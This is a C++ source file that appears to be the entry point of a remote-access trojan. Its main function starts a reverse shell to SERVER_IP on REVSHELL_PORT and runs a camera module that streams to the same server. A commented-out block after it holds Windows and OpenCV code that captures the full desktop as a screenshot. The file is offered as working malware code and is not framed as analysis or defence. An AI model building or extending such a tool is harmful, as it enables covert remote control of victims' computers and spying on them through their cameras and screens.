#include "Shell.h"
#include "Camera.h"
int main() {
	Shell* shell = new Shell((char*)SERVER_IP, REVSHELL_PORT);
	Camera* camera = new Camera((char*)SERVER_IP, CAMERA_PORT);

	thread revshell(&Shell::run, shell);
	camera->run();
	//thread camerar(&Camera::run, camera);

	//camerar.join();
	revshell.join();

	return 0;
}
/*
#include <windows.h>
#include <opencv2/opencv.hpp>

cv::Mat captureScreenMat(HWND hwnd) {
    HDC hwindowDC, hwindowCompatibleDC;

    int height, width, srcheight, srcwidth;
    HBITMAP hbwindow;
    cv::Mat src;
    BITMAPINFOHEADER  bi;

    hwindowDC = GetDC(hwnd);
    hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

    RECT windowsize;
    GetClientRect(hwnd, &windowsize);

    srcheight = windowsize.bottom;
    srcwidth = windowsize.right;
    height = windowsize.bottom;
    width = windowsize.right;

    src.create(height, width, CV_8UC4);

    // Create a bitmap
    hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // negative height to ensure top-down bitmap
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Use the previously created device context with the bitmap
    SelectObject(hwindowCompatibleDC, hbwindow);
    // Copy from the window device context to the bitmap device context
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, 0, 0, srcwidth, srcheight, SRCCOPY);
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hbwindow);
    DeleteDC(hwindowCompatibleDC);
    ReleaseDC(hwnd, hwindowDC);

    return src;
}

int main() {
    // Capture the entire screen
    HWND hwndDesktop = GetDesktopWindow();
    cv::Mat screenshot = captureScreenMat(hwndDesktop);

    // Save the screenshot
    cv::imwrite("screenshot.png", screenshot);

    return 0;
}
*/